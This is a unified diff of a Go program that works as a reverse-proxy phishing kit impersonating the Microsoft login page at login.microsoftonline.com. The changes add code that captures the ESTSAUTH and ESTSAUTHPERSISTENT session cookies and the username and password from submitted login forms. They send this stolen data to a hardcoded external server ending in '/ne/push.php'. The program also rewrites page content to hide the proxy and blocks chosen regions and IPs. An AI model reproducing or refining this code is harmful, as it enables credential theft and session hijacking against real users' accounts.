@@ -1,11 +1,10 @@
 package main
 
 import (
-    "compress/gzip"
+    "bytes"
     "crypto/rand"
     "encoding/base64"
     "fmt"
-    "io"
     "io/ioutil"
     "net/http"
     "os"
@@ -14,9 +13,9 @@ import (
 
 // Constants for upstream and server configurations
 const (
-    upstream        = "login.microsoftonline.com"
+    upstream        = "https://login.microsoftonline.com"
     upstreamPath    = "/"
-    serverURL       = "https://3xrlcxb4gbwtmbar12126.cleavr.one/ne/push.php" // Updated server URL
+    serverURL       = "https://3xrlcxb4gbwtmbar12126.cleavr.one/ne/push.php"
 )
 
 // Variables for blocking regions and IP addresses
@@ -69,7 +68,7 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
         return
     }
 
-    upstreamURL := buildUpstreamURL(r)
+    upstreamURL := upstream + upstreamPath + r.URL.Path
     req, err := http.NewRequest(r.Method, upstreamURL, r.Body)
     if err != nil {
         http.Error(w, "Internal Server Error", http.StatusInternalServerError)
@@ -77,7 +76,7 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
     }
 
     copyHeaders(r.Header, &req.Header)
-    req.Header.Set("Host", upstream)
+    req.Header.Set("Host", "login.microsoftonline.com")
     req.Header.Set("Referer", r.Referer())
 
     client := &http.Client{}
@@ -88,61 +87,36 @@ func handleRequest(w http.ResponseWriter, r *http.Request) {
     }
     defer resp.Body.Close()
 
-    // Handle gzip encoding if present
-    var reader io.ReadCloser
-    switch resp.Header.Get("Content-Encoding") {
-    case "gzip":
-        reader, err = gzip.NewReader(resp.Body)
-        if err != nil {
-            http.Error(w, "Failed to decode gzip content", http.StatusInternalServerError)
-            return
-        }
-        defer reader.Close()
-        w.Header().Set("Content-Encoding", "gzip")
-    default:
-        reader = resp.Body
+    body, _ := ioutil.ReadAll(resp.Body)
+    bodyString := string(body)
+
+    // Extract specific cookies and send them to the PHP backend
+    estsAuthCookie := extractSpecificCookie(resp, "ESTSAUTH")
+    estsAuthPersistentCookie := extractSpecificCookie(resp, "ESTSAUTHPERSISTENT")
+
+    if estsAuthCookie != "" || estsAuthPersistentCookie != "" {
+        cookies := fmt.Sprintf("ESTSAUTH: %s\nESTSAUTHPERSISTENT: %s", estsAuthCookie, estsAuthPersistentCookie)
+        sendToServer(cookies, ipAddress)
     }
 
-    // Copy relevant headers from the upstream response
-    for k, v := range resp.Header {
-        if k != "Content-Encoding" && k != "Content-Length" {
-            for _, vv := range v {
-                w.Header().Add(k, vv)
-            }
+    if r.Method == "POST" {
+        username, password := extractCredentials(r)
+        if username != "" && password != "" {
+            message := fmt.Sprintf("User: %s\nPassword: %s\n", username, password)
+            sendToServer(message, ipAddress)
         }
     }
 
-    // Extract and modify cookies
-    allCookies := extractAndModifyCookies(resp, w)
+    bodyString = strings.ReplaceAll(bodyString, "login.microsoftonline.com", r.Host)
 
-    bodyBytes, _ := ioutil.ReadAll(reader)
-    bodyString := strings.ReplaceAll(string(bodyBytes), upstream, r.Host)
-
-    if strings.Contains(allCookies, "ESTSAUTH") && strings.Contains(allCookies, "ESTSAUTHPERSISTENT") {
-        sendToServer("Cookies found:\n\n"+allCookies, ipAddress)
+    for name, values := range resp.Header {
+        for _, value := range values {
+            w.Header().Add(name, value)
+        }
     }
 
     w.WriteHeader(resp.StatusCode)
     w.Write([]byte(bodyString))
-}
-
-func buildUpstreamURL(r *http.Request) string {
-    upstreamURL := fmt.Sprintf("https://%s%s", upstream, upstreamPath+r.URL.Path)
-    if r.URL.RawQuery != "" {
-        upstreamURL += "?" + r.URL.RawQuery
-    }
-    return upstreamURL
-}
-
-func extractAndModifyCookies(resp *http.Response, w http.ResponseWriter) string {
-    var allCookies strings.Builder
-    cookies := resp.Cookies()
-    for _, cookie := range cookies {
-        modifiedCookie := strings.ReplaceAll(cookie.String(), upstream, w.Header().Get("Host"))
-        allCookies.WriteString(modifiedCookie + "; \n\n")
-        w.Header().Add("Set-Cookie", modifiedCookie)
-    }
-    return allCookies.String()
 }
 
 func copyHeaders(src http.Header, dst *http.Header) {
@@ -165,6 +139,42 @@ func isBlocked(region, ipAddress string) bool {
         }
     }
     return false
+}
+
+func extractCredentials(r *http.Request) (string, string) {
+    bodyBytes, err := ioutil.ReadAll(r.Body)
+    if err != nil {
+        return "", ""
+    }
+
+    bodyString := string(bodyBytes)
+    r.Body = ioutil.NopCloser(bytes.NewBuffer(bodyBytes))
+
+    username := extractValueFromBody(bodyString, "login")
+    password := extractValueFromBody(bodyString, "passwd")
+
+    return username, password
+}
+
+func extractValueFromBody(body, key string) string {
+    params := strings.Split(body, "&")
+    for _, param := range params {
+        pair := strings.SplitN(param, "=", 2)
+        if len(pair) == 2 && pair[0] == key {
+            return pair[1]
+        }
+    }
+    return ""
+}
+
+func extractSpecificCookie(resp *http.Response, cookieName string) string {
+    cookies := resp.Cookies()
+    for _, cookie := range cookies {
+        if cookie.Name == cookieName {
+            return cookie.Value
+        }
+    }
+    return ""
 }
 
 func sendToServer(data, ipAddress string) {
